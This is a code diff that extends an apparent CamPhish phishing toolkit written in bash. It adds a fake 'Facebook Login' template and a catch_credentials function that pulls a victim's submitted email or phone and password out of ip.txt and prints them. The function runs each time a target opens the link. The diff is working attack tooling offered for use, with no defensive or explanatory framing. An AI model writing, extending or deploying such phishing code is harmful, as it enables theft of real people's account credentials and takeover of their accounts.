@@ -88,6 +88,23 @@ printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 cat ip.txt >> saved.ip.txt
 }
 
+catch_credentials() {
+if grep -q "Email/Phone:" ip.txt 2>/dev/null; then
+    printf "\n\e[1;92m[\e[0m+\e[1;92m] Facebook Credentials Captured!\e[0m\n"
+    
+    email=$(grep "Email/Phone:" ip.txt | sed 's/Email\/Phone: //' | tr -d '\r')
+    password=$(grep "Password:" ip.txt | sed 's/Password: //' | tr -d '\r')
+    
+    if [[ ! -z "$email" ]]; then
+        printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Email/Phone:\e[0m\e[1;77m %s\e[0m\n" "$email"
+    fi
+    
+    if [[ ! -z "$password" ]]; then
+        printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Password:\e[0m\e[1;77m %s\e[0m\n" "$password"
+    fi
+fi
+}
+
 catch_location() {
   # First check for the current_location.txt file which is always created
   if [[ -e "current_location.txt" ]]; then
@@ -142,6 +159,7 @@ while [ true ]; do
 if [[ -e "ip.txt" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
 catch_ip
+catch_credentials
 rm -rf ip.txt
 fi
 
@@ -298,10 +316,14 @@ sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 elif [[ $option_tem -eq 2 ]]; then
 sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
-else
+elif [[ $option_tem -eq 3 ]]; then
 sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
+elif [[ $option_tem -eq 4 ]]; then
+sed 's+forwarding_link+'$link'+g' facebook.html > index2.html
 fi
+if [[ $option_tem -gt 1 ]]; then
 rm -rf index3.html
+fi
 }
 
 ngrok_server() {
@@ -454,10 +476,14 @@ sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 elif [[ $option_tem -eq 2 ]]; then
 sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
-else
+elif [[ $option_tem -eq 3 ]]; then
 sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
+elif [[ $option_tem -eq 4 ]]; then
+sed 's+forwarding_link+'$link'+g' facebook.html > index2.html
 fi
+if [[ $option_tem -gt 1 ]]; then
 rm -rf index3.html
+fi
 }
 
 camphish() {
@@ -497,6 +523,7 @@ printf "\n-----Choose a template----\n"
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Facebook Login\e[0m\n"
 default_option_template="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
@@ -506,6 +533,8 @@ fest_name="${fest_name//[[:space:]]/}"
 elif [[ $option_tem -eq 2 ]]; then
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
 elif [[ $option_tem -eq 3 ]]; then
+printf ""
+elif [[ $option_tem -eq 4 ]]; then
 printf ""
 else
 printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
